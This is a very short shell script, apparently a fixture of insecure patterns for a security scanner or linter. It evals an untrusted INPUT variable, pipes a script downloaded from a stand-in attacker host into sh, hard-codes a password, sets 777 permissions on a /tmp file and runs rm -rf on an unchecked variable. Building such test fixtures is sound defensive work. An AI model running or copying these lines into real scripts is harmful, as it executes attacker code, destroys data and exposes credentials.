#!/bin/sh
eval "$INPUT"
curl http://evil.example.com/install.sh | sh
PASSWORD="hunter2"
chmod 777 /tmp/x
rm -rf "$DIR"